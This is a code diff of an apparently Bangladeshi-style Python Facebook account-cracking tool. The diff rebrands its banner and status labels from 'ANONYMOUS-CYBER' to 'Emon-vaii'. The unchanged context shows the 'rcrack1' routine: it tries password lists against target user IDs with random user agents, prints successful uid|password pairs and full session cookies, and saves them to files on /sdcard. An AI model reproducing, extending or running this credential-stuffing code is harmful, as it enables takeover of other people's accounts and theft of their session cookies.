@@ -79,18 +79,18 @@ for xd in range(10000):
 
 os.system("xdg-open https://github.com/U7P4L-IN ")
 logo = ("""
- █████  ███    ██  ██████  ███    ██ ██    ██ ███    ███  ██████  ██    ██ ███████ 
-██   ██ ████   ██ ██    ██ ████   ██  ██  ██  ████  ████ ██    ██ ██    ██ ██      
-███████ ██ ██  ██ ██    ██ ██ ██  ██   ████   ██ ████ ██ ██    ██ ██    ██ ███████ 
-██   ██ ██  ██ ██ ██    ██ ██  ██ ██    ██    ██  ██  ██ ██    ██ ██    ██      ██ 
-██   ██ ██   ████  ██████  ██   ████    ██    ██      ██  ██████   ██████  ███████ 
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
- ██████ ██    ██ ██████  ███████ ██████                                            
-██       ██  ██  ██   ██ ██      ██   ██                                           
-██        ████   ██████  █████   ██████                                            
-██         ██    ██   ██ ██      ██   ██                                           
- ██████    ██    ██████  ███████ ██   ██                                           
-                                                                                                                                   
+  
+  _____                       
+ | ____|_ __ ___   ___  _ __  
+ |  _| | '_ ` _ \ / _ \| '_ \ 
+ | |___| | | | | | (_) | | | |
+ |_____|_| |_| |_|\___/|_| |_|
+  __     __    _ _            
+  \ \   / /_ _(_|_)           
+   \ \ / / _` | | |           
+    \ V / (_| | | |           
+     \_/ \__,_|_|_|           
+                                                                                                                                 
 """)
 
 class Main:
@@ -220,7 +220,7 @@ def rcrack1(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r[\033[1;92mANONYMOUS-CYBER™\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.write('\r[\033[1;92mEmon-vaii\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
             free_fb = session.get('https://x.facebook.com').text
             log_data = {
@@ -254,7 +254,7 @@ def rcrack1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\033[38;5;46m[ANONYMOUS-OK🌻] {uid}|{ps}")
+                print(f"\033[38;5;46m[Emon-OK🌻] {uid}|{ps}")
                 print(f"\n[COOKIE🎁] : {coki}")
                 open('/sdcard/U7P4L-IN/ok.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
@@ -262,14 +262,14 @@ def rcrack1(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\x1b[38;5;196m[ANONYMOUS-CP❌] {uid}|{ps}")
-                open('/sdcard/ANONYMOUS-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                print(f"\x1b[38;5;196m[Emon-CP❌] {uid}|{ps}")
+                open('/sdcard/Emon-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[ANONYMOUS-CYBER💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.write(f'\r\033[m[Emon-Vaii💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
